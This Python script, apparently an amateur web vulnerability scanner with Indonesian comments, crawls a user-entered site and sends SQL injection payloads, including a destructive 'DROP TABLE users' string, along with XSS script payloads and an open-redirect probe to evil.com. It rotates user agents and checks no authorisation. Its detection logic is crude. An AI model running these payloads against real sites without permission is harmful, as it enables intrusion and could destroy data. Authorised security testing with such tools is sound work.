import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin
import logging
import random
import time
from collections import defaultdict

# Banner ASCII dengan warna hijau
BANNER = r"""

   ___                      ____
  / _ \___ ________ ___ _  / __/______ ____  ___  ___ ____
 / ___/ _ `/ __/ _ `/  ' \_\ \/ __/ _ `/ _ \/ _ \/ -_) __/
/_/   \_,_/_/  \_,_/_/_/_/___/\__/\_,_/_//_/_//_/\__/_/

"""

# Setup logging
logging.basicConfig(filename="tool_log.txt", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logging.info("Tool started")

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36',
]

def get_random_user_agent():
    return {'User-Agent': random.choice(USER_AGENTS)}

def get_with_retry(url, headers, retries=3, delay=2):
    for attempt in range(retries):
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()  
            return response
        except requests.RequestException as e:
            logging.warning(f"Attempt {attempt + 1} failed: {e}")
            if attempt < retries - 1:
                time.sleep(delay)  
            else:
                logging.error(f"All {retries} attempts failed.")
                return None

# SQL Injection Check
def sql_injection_check(url):
    payloads = [
        "' OR 1=1--",
        '" OR 1=1--',
        "' OR 'a'='a",
        '" OR "a"="a',
        "'; DROP TABLE users; --",
    ]
    for payload in payloads:
        headers = get_random_user_agent()
        response = get_with_retry(url + payload, headers)
        if response is None:
            continue
        if "syntax" in response.text.lower() or "error" in response.text.lower():
            logging.info(f"Potential SQL Injection vulnerability found at {url} with payload {payload}")
            return True
    return False

# XSS Check
def xss_check(url):
    payloads = [
        "<script>alert(1)</script>",
        "<img src='x' onerror='alert(1)'>",
        "<iframe src='javascript:alert(1)'></iframe>"
    ]
    for payload in payloads:
        headers = get_random_user_agent()
        response = get_with_retry(url + payload, headers)
        if response is None:
            continue
        if payload in response.text:
            logging.info(f"Potential XSS vulnerability found at {url} with payload {payload}")
            return True
    return False

# CSRF Check
def csrf_check(url):
    headers = get_random_user_agent()
    response = get_with_retry(url, headers)
    if response is None:
        return False

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = None
    for input_tag in soup.find_all('input'):
        if input_tag.get('name', '').lower() == 'csrf_token' or 'token' in input_tag.get('name', '').lower():
            csrf_token = input_tag.get('value', '')
            break

    if csrf_token:
        logging.info(f"CSRF Token found at {url}")
        return False  # CSRF token exists, so it's not a vulnerability
    else:
        logging.info(f"Potential CSRF vulnerability found at {url}")
        return True

# Open Redirect Check
def open_redirect_check(url):
    payload = "http://evil.com"
    redirect_url = url + "?redirect=" + payload
    headers = get_random_user_agent()
    response = get_with_retry(redirect_url, headers)
    if response is None:
        return False
    if payload in response.url:
        logging.info(f"Potential Open Redirect vulnerability found at {redirect_url}")
        return True
    return False

# Find parameters and vulnerabilities
def find_parameters_and_vulnerabilities(url, param_name='id'):
    try:
        headers = get_random_user_agent()
        response = get_with_retry(url, headers)

        if response is None:
            return

        # Parsing HTML menggunakan BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)
        found_parameters = set()

        # Loop untuk mencari URL dengan parameter query
        for link in links:
            href = urljoin(url, link['href'])
            parsed_url = urlparse(href)
            query_params = parse_qs(parsed_url.query)

            if param_name in query_params:
                found_parameters.add(href)

        # Kerentanannya
        if sql_injection_check(url):
            logging.info(f"SQL Injection vulnerability found at {url}")

        if xss_check(url):
            logging.info(f"XSS vulnerability found at {url}")

        if csrf_check(url):
            logging.info(f"CSRF vulnerability found at {url}")

        if open_redirect_check(url):
            logging.info(f"Open Redirect vulnerability found at {url}")

        if found_parameters:
            with open(f"hasil_{param_name}.txt", "w") as file:
                for param in found_parameters:
                    file.write(param + "\n")
            logging.info(f"Parameter '{param_name}' ditemukan dan disimpan.")
        else:
            print(f"\033[91m[-] Tidak ada parameter '{param_name}' ditemukan.\033[0m")
            logging.info(f"No parameters '{param_name}' found.")
    except Exception as e:
        logging.error(f"Error terjadi saat pemindaian: {e}")
        print(f"\033[91m[!] Error: {e}\033[0m")

if __name__ == "__main__":
    print(BANNER)
    print("\033[92m╔══════════════════════════════════════════════════╗")
    print("║                Created By: ./Hotaa404            ║")
    print("║                Version: 1.0                      ║")
    print("╚══════════════════════════════════════════════════╝")

    website_url = input("\033[92m[?] Masukkan URL website:\033[0m")
    
    # Menambahkan pengecekan apakah URL valid dan lengkap
    if not website_url.startswith(('http://', 'https://')):
        website_url = 'http://' + website_url

    find_parameters_and_vulnerabilities(website_url)